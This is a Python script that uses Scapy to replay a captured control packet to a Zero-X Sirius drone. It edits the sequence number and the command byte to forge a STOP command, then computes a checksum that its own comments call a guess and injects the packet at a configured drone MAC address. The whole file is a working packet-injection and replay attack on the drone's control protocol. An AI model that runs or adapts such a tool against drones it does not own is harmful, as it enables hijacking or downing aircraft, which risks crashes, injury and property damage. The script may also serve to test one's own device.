import struct
import time
from scapy.all import rdpcap, send, Raw, Ether, IP, UDP # Import necessary Scapy modules

# --- CONFIGURATION ---
# IMPORTANT:
# 1. You must replace 'path/to/stop_command.pcap' with your actual .pcap file name.
# 2. You must replace 'wlan0' with your drone control interface (e.g., 'wlan0', 'Wi-Fi').
# 3. This script requires running with administrative/root privileges (sudo).

PCAP_FILE_PATH = 'sirius_off-on-stop-off_capture.pcap' 
INTERFACE = 'wlan0mon' # <--- CHANGE THIS TO YOUR WIFI INTERFACE
TARGET_MAC_DST = 'C4:D7:FD:0E:F3:6D' # Placeholder, REPLACE with the actual MAC of the drone (Destination MAC)

# --- IDENTIFIED PROTOCOL INDICES (0-based, relative to the raw UDP/Custom Payload) ---
SEQ_NUM_INDEX = 12       # The byte that increments (e.g., 19 -> 1a)
COMMAND_BYTE_INDEX = 96  # The byte that controls the state (01=Active, 00=Stop)
CHECKSUM_START_INDEX = 104 # The start of the checksum/CRC field

# The packet type we are modifying has a total payload length of 116 bytes.
PAYLOAD_LENGTH = 116 # 86, 88, 116, 144, ect
enforce_len = False

# --- PLACEHOLDER CHECKSUM FUNCTION (8-bit XOR) ---
# NOTE: This is a GUESS. If replay fails, this is the most likely culprit.
def calculate_simple_checksum(payload_bytes, checksum_start):
    """Calculates a simple 8-bit XOR checksum over the payload up to the checksum start."""
    checksum = 0
    # Calculate checksum over bytes 0 up to (but not including) the CHECKSUM_START_INDEX
    for i in range(checksum_start):
        checksum ^= payload_bytes[i]
    return checksum

# --- CORE REPLAY FUNCTION ---
def replay_drone_command(target_payload, command_value, interface):
    """
    Loads a base packet, updates dynamic fields, recalculates checksum, and sends it.

    Args:
        target_payload (bytes): The raw payload bytes of the base packet.
        command_value (int): The new value for the Command Byte (0 for STOP).
        interface (str): The network interface to send the packet on.
    """
    print(f"[*] Base Payload Length: {len(target_payload)} bytes.")

    # 1. Convert bytes to a mutable list of integers for modification
    payload_list = list(target_payload)
    
    if enforce_len and len(payload_list) != PAYLOAD_LENGTH:
        print(f"[!] Warning: Payload size mismatch. Expected {PAYLOAD_LENGTH}, got {len(payload_list)}. Aborting.")
        return

    # 2. Update Dynamic Fields
    
    # Sequence Number Increment
    current_seq_num = payload_list[SEQ_NUM_INDEX]
    new_seq_num = (current_seq_num + 1) % 256 # Increment by 1 (handling 255 -> 0 rollover)
    payload_list[SEQ_NUM_INDEX] = new_seq_num
    
    # Set the Command Byte (e.g., 0x00 for STOP)
    payload_list[COMMAND_BYTE_INDEX] = command_value

    print(f"[+] Updated Sequence Num (Index {SEQ_NUM_INDEX}): {current_seq_num} (0x{current_seq_num:02x}) -> {new_seq_num} (0x{new_seq_num:02x})")
    print(f"[+] Setting Command Byte (Index {COMMAND_BYTE_INDEX}) to: 0x{command_value:02x}")


    # 3. Recalculate and Update Checksum (Using the simple XOR guess)
    
    # Convert list back to bytes for checksum calculation
    modified_payload_bytes = bytes(payload_list)
    
    # Calculate checksum over the modified, non-checksum portion (0 to 103)
    new_checksum_value = calculate_simple_checksum(modified_payload_bytes, CHECKSUM_START_INDEX)

    # Write the new checksum back into the checksum byte (Index 104)
    # NOTE: Since we don't know the exact CRC length (1, 2, or 4 bytes), we will write it to the first byte of the region (Index 104).
    payload_list[CHECKSUM_START_INDEX] = new_checksum_value 
    
    print(f"[+] Calculated Checksum (Index {CHECKSUM_START_INDEX}): 0x{new_checksum_value:02x} (This is a guess, may need refinement!)")

    # Final Modified Payload
    final_payload = bytes(payload_list)

    # 4. Rebuild and Send the Packet
    
    # Load the base packet again to extract the headers (Scapy handles this automatically)
    base_packet = rdpcap(PCAP_FILE_PATH)[0]
    
    # Construct a new packet with the correct layers from the original
    # We assume the packet structure is: Ether / IP / UDP / Raw (Custom Payload)
    
    # Use the base packet's IP and UDP layers, but replace the Raw payload
    # Note: Scapy automatically recalculates IP/UDP checksums when layers are replaced.
    try:
        new_packet = base_packet[Ether]
        # Ensure destination MAC is correct (critical for layer 2 injection)
        new_packet.dst = TARGET_MAC_DST

        # Rebuild IP and UDP layers with the modified Raw payload
        new_packet = new_packet[IP]
        new_packet[UDP].payload = Raw(final_payload)
        
        # Scapy re-calculates L3/L4 checksums, so we only worry about the custom protocol checksum
        
        print(f"\n[SND] Injecting 1 packet on interface: {interface}...")
        send(new_packet, iface=interface, verbose=False)
        print("[SND] Command packet sent successfully!")
        
    except IndexError:
        print("[!] Error: Could not parse Ethernet, IP, or UDP layers from the base packet. Check your PCAP file layers.")
    except Exception as e:
        print(f"[!] Error sending packet: {e}. Ensure you are running with sudo/admin privileges and the interface name is correct.")


# --- MAIN EXECUTION ---
if __name__ == "__main__":
    
    # Load the PCAP file. We only need the first packet as a template.
    try:
        packets = rdpcap(PCAP_FILE_PATH)
        if not packets:
            print(f"[!] Error: PCAP file '{PCAP_FILE_PATH}' is empty or not found.")
        
        # 1. Extract the raw payload from the first packet
        base_packet = packets[0]
        target_payload = bytes(base_packet[Raw])
        
        # 2. Execute the replay with the STOP command value (0x00)
        # Assuming 0x01 is the active/fly state, and 0x00 is the desired STOP state.
        STOP_COMMAND_VALUE = 0x00
        
        print("--- Zero-X Sirius STOP Command Replay ---")
        replay_drone_command(target_payload, STOP_COMMAND_VALUE, INTERFACE)

    except FileNotFoundError:
        print(f"[!] Error: PCAP file '{PCAP_FILE_PATH}' not found. Please check the path.")
    except IndexError:
        print(f"[!] Error: The base packet is missing the 'Raw' data layer. Ensure your pcap contains the UDP payload data.")
    except Exception as e:
        print(f"[!] An unexpected error occurred: {e}")
